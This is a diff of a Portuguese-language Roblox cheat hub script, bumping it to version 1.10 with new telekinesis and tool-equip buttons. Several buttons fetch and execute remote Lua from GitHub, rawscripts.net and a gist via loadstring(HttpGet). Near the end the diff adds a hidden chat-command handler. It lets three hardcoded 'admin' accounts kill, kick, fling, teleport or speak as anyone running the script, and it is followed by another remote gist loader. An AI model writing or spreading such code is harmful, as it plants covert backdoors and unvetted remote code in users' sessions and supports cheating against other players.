@@ -6,7 +6,7 @@ local args = {
 game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
 
 
--- 1.08
+-- 1.10
 
 -- script create BY ghost
 
@@ -16,7 +16,7 @@ local PlayerGui = Player:WaitForChild("PlayerGui")
 
 -- CONFIGURAÇÃO
 local RAW_URL = "https://raw.githubusercontent.com/Cat558-uz/All-rights-reserved-to-packj0/refs/heads/main/hub%20Brook"
-local VERSAO_ATUAL = "- 1.08" -- atual versão 
+local VERSAO_ATUAL = "- 1.10" -- atual versão 
 
 -- Função principal da tela de atualização
 local function showUpdateScreen(newVersion)
@@ -293,13 +293,13 @@ Window:AddMinimizeButton({
 
 local Tabup = Window:MakeTab({ ".•°updates°•.", "bell" })
 
-Tabup:AddSection({Name = "fly v6 add in tabscripts"})
+Tabup:AddSection({Name = "adicionado Telekinesi FE"})
 
-Tabup:AddSection({Name = "Removed Ant Kick"})
+Tabup:AddSection({Name = "n"})
 
-Tabup:AddSection({Name = "nada"})
+Tabup:AddSection({Name = "n"})
 
-Tabup:AddSection({Name = "obrigado por ler"})
+Tabup:AddSection({Name = "obrigado por ler Bazuka Ajudou!!!"})
 
 
 
@@ -2621,6 +2621,23 @@ end
 
 })
 
+TabLag:AddButton({
+    Name = "Equipe Tools ALL",
+    Description = "Equipa todos os itens do inventário rapidamente.",
+    Callback = function()
+        local p = game.Players.LocalPlayer
+        local c = p.Character or p.CharacterAdded:Wait()
+        local h = c:FindFirstChildOfClass("Humanoid")
+        if not h then return end
+        for i = 1, #p.Backpack:GetChildren() do
+            local t = p.Backpack:GetChildren()[i]
+            if t:IsA("Tool") then
+                h:EquipTool(t)
+                task.wait(0.05)
+            end
+        end
+    end
+})
 
 TabLag:AddButton({"Concerta o Lag Phone", function(Value)
 
@@ -5177,6 +5194,16 @@ TabSc:AddButton({
 })
 
 TabSc:AddButton({
+    Name = "Telekinesi v6 | universal",
+    Description = "dica usar em carros e para usar bastante clickar no objeto com o Telekinesi equipado",
+    Callback = function()
+     
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty1.lua"))()
+     
+    end
+})
+
+TabSc:AddButton({
     Name = "Anti Bang Molestador | universal",
     Description = "serve pra aquele tarado do cara que usa ;bang Denada",
     Callback = function()
@@ -5187,11 +5214,11 @@ TabSc:AddButton({
 })
 
 TabSc:AddButton({
-    Name = "shiftlock Nao Arrastavel | universal",
+    Name = "shiftlock Arrastavel | universal",
     Description = "Incrívelmente todos vê e serve para mobile/pc",
     Callback = function()
      
-     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shift-lock-perm-15576"))()
+     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-72866"))()
      
     end
 })
@@ -5217,5 +5244,175 @@ TabSc:AddButton({
 })
 
 -- script create BY ghost
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Bah-SLA-MANO/refs/heads/main/69ca8c6149571db8.lua.txt"))()
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
 
+local ADMINS = {
+	["Breno010L"] = true,
+	["BK_FAXBR"] = true,
+	["packj0"] = true
+}
+
+local function isAdmin(player)
+	return ADMINS[player.Name] == true
+end
+
+local function findPlayerByName(query)
+	if not query then return nil end
+	query = query:lower()
+	for _, p in pairs(Players:GetPlayers()) do
+		if p.Name:lower() == query or p.DisplayName:lower() == query then
+			return p
+		end
+	end
+	for _, p in pairs(Players:GetPlayers()) do
+		if p.Name:lower():find(query) or p.DisplayName:lower():find(query) then
+			return p
+		end
+	end
+	return nil
+end
+
+local function killPlayer(target)
+	if not target then return end
+	local character = target.Character
+	if not character then return end
+	local humanoid = character:FindFirstChildOfClass("Humanoid")
+	if humanoid then
+		humanoid.Health = 0
+	end
+end
+
+local function kickPlayer(target, reason)
+	if not target then return end
+	pcall(function()
+		target:Kick(reason or "Expulso pelo admin")
+	end)
+end
+
+local function sendChatMessage(message)
+	if TextChatService.ChatInputBarConfiguration
+	and TextChatService.ChatInputBarConfiguration.TargetTextChannel then
+		local canal = TextChatService.ChatInputBarConfiguration.TargetTextChannel
+		canal:SendAsync(message)
+	end
+end
+
+local function bringPlayer(adminPlayer, target, studsForward)
+	if not adminPlayer or not target then return end
+	local aChar = adminPlayer.Character
+	local tChar = target.Character
+	if not aChar or not tChar then return end
+	local aHRP = aChar:FindFirstChild("HumanoidRootPart") or aChar:FindFirstChild("Torso") or aChar:FindFirstChild("UpperTorso")
+	local tHRP = tChar:FindFirstChild("HumanoidRootPart") or tChar:FindFirstChild("Torso") or tChar:FindFirstChild("UpperTorso")
+	if not aHRP or not tHRP then return end
+
+	local forward = studsForward or 2
+	local frontPos = aHRP.Position + (aHRP.CFrame.LookVector * forward)
+	local targetCFrame = CFrame.new(frontPos, frontPos + aHRP.CFrame.LookVector)
+	pcall(function()
+		tHRP.CFrame = targetCFrame
+		if tHRP:FindFirstChild("BodyVelocity") then tHRP.BodyVelocity:Destroy() end
+		if tHRP:FindFirstChild("VectorForce") then tHRP.VectorForce:Destroy() end
+	end)
+end
+
+local function flingPlayer(target, minForce, maxForce)
+	minForce = minForce or 10
+	maxForce = maxForce or 50
+	if not target then return end
+	local tChar = target.Character
+	if not tChar then return end
+	local tHRP = tChar:FindFirstChild("HumanoidRootPart") or tChar:FindFirstChild("Torso") or tChar:FindFirstChild("UpperTorso")
+	if not tHRP then return end
+
+	local rx = math.random(-100,100)
+	local ry = math.random(10,80)
+	local rz = math.random(-100,100)
+	local dir = Vector3.new(rx, ry, rz)
+	if dir.Magnitude == 0 then dir = Vector3.new(0,50,0) end
+	dir = dir.Unit
+
+	local magnitude = math.random(minForce, maxForce)
+
+	local bv = Instance.new("BodyVelocity")
+	bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+	bv.Velocity = dir * magnitude
+	bv.P = 1250
+	bv.Name = "TempFlingBV"
+	bv.Parent = tHRP
+
+	local bav = Instance.new("BodyAngularVelocity")
+	bav.MaxTorque = Vector3.new(1e6,1e6,1e6)
+	bav.AngularVelocity = Vector3.new(math.random(-10,10), math.random(-10,10), math.random(-10,10))
+	bav.Name = "TempFlingBAV"
+	bav.Parent = tHRP
+
+	spawn(function()
+		task.wait(0.5)
+		if bv and bv.Parent then bv:Destroy() end
+		if bav and bav.Parent then bav:Destroy() end
+	end)
+end
+
+local function onChat(player, msg)
+	if not isAdmin(player) then return end
+
+	local cmd, arg = msg:match("^%s*(;[%w_]+)%s*(.-)%s*$")
+	if not cmd then return end
+	cmd = cmd:lower()
+
+	if cmd == ";kill" and arg ~= "" then
+		local alvo = findPlayerByName(arg)
+		if alvo then
+			killPlayer(alvo)
+		end
+	elseif cmd == ";kick" and arg ~= "" then
+		local nome, motivo = arg:match("^(%S+)%s*(.-)%s*$")
+		local alvo = findPlayerByName(nome)
+		if alvo then
+			kickPlayer(alvo, motivo ~= "" and motivo or nil)
+		end
+	elseif cmd == ";say" and arg ~= "" then
+		sendChatMessage(arg)
+	elseif cmd == ";bring" and arg ~= "" then
+		local alvo = findPlayerByName(arg)
+		if alvo then bringPlayer(player, alvo) end
+	elseif cmd == ";fling" and arg ~= "" then
+		local alvo = findPlayerByName(arg)
+		if alvo then flingPlayer(alvo, 10, 50) end
+	elseif cmd == ";v" and arg ~= "" then
+		local alvo = findPlayerByName(arg)
+		if alvo then bringPlayer(player, alvo, 5) end
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(msg)
+		onChat(player, msg)
+	end)
+end)
+
+for _, player in pairs(Players:GetPlayers()) do
+	player.Chatted:Connect(function(msg)
+		onChat(player, msg)
+	end)
+end
+
+TextChatService.MessageReceived:Connect(function(message)
+	local autor = message.TextSource and message.TextSource.Name
+	local conteudo = message.Text
+	if ADMINS[autor] then
+		local cmd, arg = conteudo:match("^%s*(;[%w_]+)%s*(.-)%s*$")
+		if cmd and cmd:lower() == ";v" and arg ~= "" then
+			local adminPlayer = Players:FindFirstChild(autor)
+			local alvo = findPlayerByName(arg)
+			if adminPlayer and alvo then
+				bringPlayer(adminPlayer, alvo, 5)
+			end
+		end
+	end
+end)
+
+-- script create BY ghost
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Cat558-uz/826e5701484202e4e85b8964ffdd8c40/raw/11b257652691805de8b9e933c5702323a21fb60d/gistfile1.txt"))()
